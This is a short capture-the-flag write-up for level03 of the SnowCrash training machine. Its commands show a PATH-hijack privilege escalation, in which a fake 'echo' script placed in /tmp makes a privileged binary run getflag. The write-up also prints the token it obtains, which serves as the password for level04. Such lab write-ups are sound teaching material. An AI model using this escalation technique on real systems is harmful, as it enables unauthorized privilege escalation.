 # 1st Step
```
level03@SnowCrash:~$ ./level03
Exploit me
level03@SnowCrash:~$ strings level03 | grep "Exploit me"
/usr/bin/env echo Exploit me
level03@SnowCrash:~$
```  
As we can see we have to exploit the command echo  
The followings steps is thank to this [help](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/) at the method 4:  
```
level03@SnowCrash:~$ cd /tmp
level03@SnowCrash:/tmp$ echo '/bin/getflag' > echo
level03@SnowCrash:/tmp$ chmod 777 echo
level03@SnowCrash:/tmp$ ls -l echo
-rwxrwxrwx 1 level03 level03 13 Mar 11 23:37 echo
level03@SnowCrash:/tmp$ export PATH=/tmp:$PATH
level03@SnowCrash:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```  

# 2nd Step
Now we can re-execute `level03`
```
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$ su level04
Password:
level04@SnowCrash:~$
```  
Level03 passed !  
  
*Useful website: [PATH](https://www.commentcamarche.net/faq/3585-bash-la-variable-d-environnement-path)*